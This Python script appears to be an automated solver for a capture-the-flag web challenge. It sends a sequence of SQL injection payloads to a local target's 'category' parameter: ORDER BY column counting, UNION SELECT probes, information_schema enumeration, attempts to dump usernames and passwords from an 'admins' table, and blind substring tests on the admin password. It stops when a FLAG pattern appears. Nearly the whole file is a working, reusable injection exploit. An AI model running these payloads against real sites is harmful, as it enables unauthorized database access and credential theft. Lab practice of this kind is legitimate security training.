import requests
import urllib.parse
import re
import sys

target = "http://127.0.0.1:32780/"
session_cookie = {"PHPSESSID": "a619c2d322b0d2025997d9751eb6d09a"}

def send_payload(payload):
    """Send SQL injection payload and return response data"""
    encoded = urllib.parse.quote(payload)
    try:
        r = requests.get(f"{target}?category={encoded}", 
                        cookies=session_cookie, 
                        timeout=10)
        return r.text, r.status_code, dict(r.headers)
    except Exception as e:
        return f"Error: {e}", 0, {}

def check_for_flag(response_text):
    """Search for FLAG pattern in response"""
    flag_pattern = r'FLAG\{[^}]+\}'
    matches = re.findall(flag_pattern, response_text)
    return matches

def analyze_response(response, status, headers, payload_name):
    """Analyze and print response details"""
    print(f"\n{'='*60}")
    print(f"[{payload_name}] Status: {status}")
    print(f"Response size: {len(response)} bytes")
    print(f"Headers: {headers}")
    print(f"\nResponse preview (first 800 chars):\n{response[:800]}")
    if len(response) > 800:
        print("... (truncated)")
    
    flags = check_for_flag(response)
    if flags:
        print(f"\n[!] FLAG FOUND: {flags}")
        return True
    return False

print("="*80)
print("SQL INJECTION - SYSTEMATIC DATA EXTRACTION")
print("="*80)

# Step 1: Determine column count using ORDER BY technique
print("\n[PHASE 1] Determining column count using ORDER BY...")
print("="*80)

column_count = 0
for i in range(1, 20):
    payload = f"1' ORDER BY {i}--"
    response, status, headers = send_payload(payload)
    
    print(f"Testing ORDER BY {i:2d} - Status: {status} | Size: {len(response)}B", end="")
    
    # Check for errors that indicate column doesn't exist
    if status == 200 and ("error" not in response.lower() and "unknown" not in response.lower()):
        column_count = i
        print(" ✓")
    else:
        print(" ✗")
        # If this column fails but previous succeeded, we found the max
        if column_count > 0:
            print(f"\n[!] Maximum column count: {column_count}")
            break

if column_count == 0:
    print("\n[!] Could not determine column count with ORDER BY, trying UNION...")
    column_count = 6  # Start with a reasonable guess

# Step 2: Test UNION with determined column count
print(f"\n[PHASE 2] Testing UNION injection with {column_count} columns...")
print("="*80)

# Build UNION payload dynamically based on column count
union_payload = "' UNION SELECT "
union_payload += ",".join([str(i) for i in range(1, column_count + 1)])
union_payload += "--"

print(f"\nTesting UNION payload: {union_payload}")
response, status, headers = send_payload(union_payload)
flag_found = analyze_response(response, status, headers, "UNION_BASE")

if flag_found:
    sys.exit(0)

# Step 3: Information schema queries to find tables
print(f"\n[PHASE 3] Querying information schema for table names...")
print("="*80)

# Find all table names
info_schema_payload = f"' UNION SELECT 1,2,TABLE_NAME,4,5,6 FROM information_schema.tables WHERE TABLE_SCHEMA=database() LIMIT 10--"
response, status, headers = send_payload(info_schema_payload)
flag_found = analyze_response(response, status, headers, "INFO_SCHEMA_TABLES")

if flag_found:
    sys.exit(0)

# Step 4: Specifically target admins table
print(f"\n[PHASE 4] Directly querying admins table...")
print("="*80)

# Try common admin table structures
admin_payloads = [
    f"' UNION SELECT 1,2,3,4,5,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,username,password,4,5,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,user,pass,4,5,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,admin_user,admin_pass,4,5,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,name,password,4,5,6 FROM admin LIMIT 5--",
]

for i, payload in enumerate(admin_payloads, 1):
    print(f"\n--- Testing Admin Payload {i} ---")
    print(f"Payload: {payload}")
    response, status, headers = send_payload(payload)
    flag_found = analyze_response(response, status, headers, f"ADMIN_QUERY_{i}")
    
    if flag_found:
        sys.exit(0)

# Step 5: Extract column names from admins table
print(f"\n[PHASE 5] Extracting column names from admins table...")
print("="*80)

column_payload = f"' UNION SELECT 1,2,COLUMN_NAME,4,5,6 FROM information_schema.columns WHERE TABLE_NAME='admins' LIMIT 10--"
response, status, headers = send_payload(column_payload)
flag_found = analyze_response(response, status, headers, "ADMINS_COLUMNS")

if flag_found:
    sys.exit(0)

# Step 6: Try to extract all data from admins table with guessed common columns
print(f"\n[PHASE 6] Extracting admin credentials with common column names...")
print("="*80)

credential_payloads = [
    # Common credential structures
    f"' UNION SELECT 1,id,username,password,email,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,username,password,email,role,created FROM admins LIMIT 5--",
    f"' UNION SELECT 1,user_login,user_pass,user_email,user_role,6 FROM admins LIMIT 5--",
    f"' UNION SELECT 1,admin_name,admin_password,admin_email,admin_level,6 FROM admins LIMIT 5--",
]

for i, payload in enumerate(credential_payloads, 1):
    print(f"\n--- Testing Credential Payload {i} ---")
    print(f"Payload: {payload}")
    response, status, headers = send_payload(payload)
    flag_found = analyze_response(response, status, headers, f"CREDENTIALS_{i}")
    
    if flag_found:
        sys.exit(0)

# Step 7: Blind SQL injection fallback (if union doesn't work)
print(f"\n[PHASE 7] Testing blind SQL injection (conditional responses)...")
print("="*80)

blind_payloads = [
    # Test for conditional responses based on substring matching
    ("Test 'a' in first char of admin password", "' AND SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)='a'--"),
    ("Test SQL version", "' AND substring(version(),1,1)='5'--"),
    ("Test for admins table existence", "' AND (SELECT COUNT(*) FROM admins)>0--"),
]

for name, payload in blind_payloads:
    print(f"\n--- {name} ---")
    print(f"Payload: {payload}")
    response, status, headers = send_payload(payload)
    
    # Look for differences in response compared to baseline
    baseline_response, _, _ = send_payload("1'")
    
    print(f"Status: {status} | Size: {len(response)}B")
    print(f"Baseline size: {len(baseline_response)}B")
    
    if len(response) != len(baseline_response):
        print(f"[!] DIFFERENCE DETECTED - Response changed!")
        print(f"Response preview: {response[:500]}")
    
    flags = check_for_flag(response)
    if flags:
        print(f"[!] FLAG FOUND: {flags}")
        sys.exit(0)

print("\n" + "="*80)
print("Testing completed. Check proofs section for all responses.")
